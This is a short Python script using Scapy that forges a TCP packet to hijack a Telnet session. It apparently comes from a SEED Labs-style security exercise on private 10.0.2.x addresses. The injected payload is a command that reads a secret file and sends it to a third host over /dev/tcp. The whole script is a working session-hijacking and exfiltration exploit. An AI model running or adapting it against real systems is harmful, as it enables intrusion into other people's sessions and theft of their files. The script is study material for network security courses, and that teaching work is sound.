#!/usr/bin/python3

import sys
from scapy.all import *

print("Sending session hijacking packet")

IPLayer = IP(src="10.0.2.4", dst="10.0.2.5")
TCPLayer = TCP(sport=35400, dport=23, flags="A", seq=708037794, ack=1519311855)
Data = "\ncat /home/seed/host/secret > /dev/tcp/10.0.2.15/9090\n"
pkt=IPLayer/TCPLayer/Data
ls(pkt)
send(pkt, verbose=0)